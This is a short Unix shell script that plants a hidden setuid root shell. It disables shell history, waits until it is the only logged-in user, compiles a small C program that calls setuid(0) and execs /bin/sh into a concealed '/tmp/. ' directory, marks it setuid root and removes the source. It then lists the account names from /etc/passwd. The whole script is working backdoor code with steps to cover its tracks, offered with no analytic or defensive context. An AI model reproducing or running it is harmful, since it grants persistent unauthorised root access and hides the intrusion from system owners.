#!/bin/sh

unset HISTFILE;
unset HISTSAVE;

code=$(cat<<EOF
int main(void) {
  setgid(0); setuid(0);
  execl("/bin/sh", "sh", 0);
}
EOF
)

users=$(w|grep -v load|grep -v JCPU|wc -l);
if [ "$users" != "1" ]; then 
  logout;
else 

  mkdir /tmp/". ";
  cd /tmp/". ";
  echo $code>./.sh.c
  gcc -o ./.sh ./.sh.c
  chown root:root ./.sh
  chmod u+s ./.sh
  rm ./.sh.c
  logout;

fi

accounts=$(cut -f1 -d: /etc/passwd);
echo $accounts
